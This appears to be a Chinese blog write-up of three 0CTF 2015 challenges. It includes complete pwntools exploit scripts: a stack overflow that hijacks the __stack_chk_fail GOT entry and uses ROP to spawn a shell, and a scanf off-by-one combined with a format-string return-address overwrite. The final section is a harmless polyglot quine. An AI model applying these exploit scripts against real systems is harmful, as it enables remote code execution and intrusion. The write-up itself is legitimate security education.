---
title: 0CTF writeup
author: rk700
layout: post
redirect_from:
  - /writeup/2015/03/31/0ctf-writeup
  - /writeup/2015/03/31/0ctf-writeup/
tags:
  - exploit
  - misc
---

周末参加了今年的第二次CTF，0CTF。与BCTF类似，这次的溢出、逆向题目也是非常有水平的，令人大开眼界。下面是我的部分的writeup。

## flaggenerator

这道题的溢出还是比较明显的。在leetify时，一个`h`字符会被变成`1-1`三个字符，从而长度变长，造成栈溢出。但这道题有stack canary保护，如果我们栈溢出修改了返回地址，就会触发`__stack_chk_fail`。而读了一遍伪代码之后并没有发现可以泄露canary的地方，于是肯定会触发调用`__stack_chk_fail`了。

但是，在leetify的最后一步是`strcpy`，而目标`dest`是从栈上取的，源`src`是我们提供的flag（虽然有些字符被leetify了）。`dest`是我们可以覆盖到的，于是，如果我们把`strcpy`的目标地址改为GOT，造成修改`__stack_chk_fail@got`，那么就可以调用我们提供的函数了。

在调用`__stack_chk_fail@got`时，栈顶还是之前`strcpy`的参数。我用的是`leave; ret`，这样把`ebp`设为我们覆盖的一个地址，再跳回leetify的返回地址，那里也是被我们所覆盖的，进而ROP下去。pwntools里好像有写ROP的功能，我不太熟，还是手工构造的。具体地，先`put`打印GOT，获得库函数地址；然后调用程序里一个类似`readline`的函数，将`system`和字符串`/bin/sh`读到固定位置；最后`leave; ret`，执行`system("bin/sh")`。下面是代码：

{% highlight python %}
#!/usr/bin/env python2

from pwn import *
import sys 

if __name__ == '__main__' :
    context(arch='i386', os='linux')
    
    elf = ELF('flagen')

    #ip = "127.0.0.1"
    ip = sys.argv[1]
    conn = remote(ip, 5149)

    #len=9
    newGOT = [0x080484e6, 0x080484f6, 0x08048506, 0x08048516, 0x08048526, 0xf7e24570, 0x08048546, 0x08048556, 0x08048566]
    leave = 0x080485d8 
    newGOT[0] = leave #leave; ret
    newEbp = 0x0804b610
    newDest = 0x0804b01c #__stack_chk_fail@got
    popRet = 0x08048481 #pop ebx; ret
    newRet = popRet
    puts = 0x08048510 #puts@plt
    read = 0x0804b00c #read@got
    readLine = 0x080486cb
    count = 0x01010101
    sh = newEbp + 4*4 
    bsh = 0xf7f6a3a8

    #0x10c=4*9+77*3+1
    payload1 = "1\n" + "".join([p32(x) for x in newGOT]) + "h"*77 + "a" + p32(newEbp) + p32(popRet) + p32(newDest) + p32(puts) + p32(popRet) + p32(read) + p32(readLine) + p32(leave) + p32(newEbp) + p32(count) + "\n4\n"
    #total: 4*9+77+1+4*10=154

    conn.recvuntil("Your choice: ")
    conn.send(payload1)

    conn.recvuntil("Your choice: ")
    a1 = conn.recvn(4) 
    readAddr = unpack(a1)
    print(hex(readAddr))

    #system = 0xf7e46d70
    system = readAddr - 0x9aa40
    payload2 = p32(newEbp) + p32(system) + p32(popRet) + p32(sh) + "/bin//sh\n"
    conn.send(payload2)

    conn.interactive()
{% endhighlight %}

## login

这道题是PIE的，所以我调试下断点遇到了一点麻烦。最后我的方法是：在库函数`MD5`下断点，运行到那里后，`finish`回到原程序里，然后一步步走下去。

很明显，我们需要调用读flag文件的那个函数，为此我们需要成为normal user。再新login用户时的`scanf`有问题，这里它用的是`%256s`，这样如果输入256个字符，就会读256个，并添加一个`\x00`在最后。这样，就可以修改那里，成为normal user了。

然后，在隐藏的选项4里，存在format string attack，而且一共有两次。于是我们可以在第一次得到内存地址，然后第二次修改来跳到读flag的函数那里。具体地，通过大量打印内存，我们发现`printf`的第3个参数是栈上的某处，由此可以得到返回地址在栈上的地址；第75个参数是返回地址，由此我们可以得到`.text`的基地址，进而得到读flag的函数的地址。然后，在第二次`printf`时，我们修改返回地址为读flag，就可以在`printf`结束后获得flag了。

下面是代码：

{% highlight python %}
#!/usr/bin/env python2

from pwn import *
import sys 

if __name__ == '__main__' :
    context(arch='i386', os='linux')
    
    #ip = "127.0.0.1"
    ip = sys.argv[1]
    conn = remote(ip, 10910)

    payload = "guest\nguest123\n2\n" + "A"*256 + "4\n" + "%3$p,%75$p\n1234\n"

    conn.send(payload)

    conn.recvuntil("Password: ")
    conn.recvuntil("Password: ")
    addrs = (conn.recvline(keepends=False).split(" ")[0]).split(',')
    print addrs

    stack = int(addrs[0], 16) 
    base = int(addrs[1], 16)-0x12d3
    retAddr1 = stack - 0x8 
    retAddr2 = retAddr1+1
    print hex(retAddr1)
    print hex(base)

    high = (base & 0xff00) >> 8
    print hex(high)

    newHigh = high + 0x11
    part1 = "%8x%11$hhn"
    count = newHigh -8
    print "count 2 is %d" % count

    if count > 13 and count < 100:
        part2 = "aaa%%%dx%%12$hhn" % (count-3)
    elif count > 102:
        part2 = "aa%%%dx%%12$hhn" % (count-2)

    print len(part1)+len(part2)
    print part1+part2

    payload = part1+part2+p64(retAddr1)+p64(retAddr2) + "\n1234\n"

    conn.send(payload)
    conn.interactive()
{% endhighlight %}

## polyglot quine
其实两道题都是考察的它，只不过第一题只要求5种语言里的3种通过即可，第二题则要求5种语言全部通过。第一题我是直接搜索在[http://shinh.skr.jp/obf/](http://shinh.skr.jp/obf/)得到的，它已经满足c, python2, ruby和perl了。但python3还不满足，为此我研究了一下这段代码。

实验发现，python3之所以不满足，是因为python里的`print`会附加一个换行符在最后。为了解决这个问题，代码里用的是`print a%b,`，即在`print`之后添加一个逗号使得不打印换行符。但这只对python2有效，python3就不行了。

经过一番思考，我发现可以通过`rstrip()`去掉结尾的换行符，然后再`print`添加一个换行符，这样就做到了只有一个换行符了，而且这样对python2和python3都可以。下面就是我修改后可以通过5种语言的代码:

{% raw %}
<pre>
 #include/*
s='''*/<stdio.h>
main(){char*_;/*==;sub _:lvalue{$_}<<s;#';<<s#'''
def printf(a,*b):print((a%b).rstrip())
s
#*/
_=" #include/*%cs='''*/<stdio.h>%cmain(){char*_;/*==;sub _:lvalue{%c_}<<s;#';<<s#'''%cdef printf(a,*b):print((a%%b).rstrip())%cs%c#*/%c_=%c%s%c;printf(_,10,10,36,10,10,10,10,34,_,34,10,10,10,10);%c#/*%cs='''*/%c}//'''#==%c";printf(_,10,10,36,10,10,10,10,34,_,34,10,10,10,10);
#/*
s='''*/
}//'''#==
</pre>
{% endraw %}
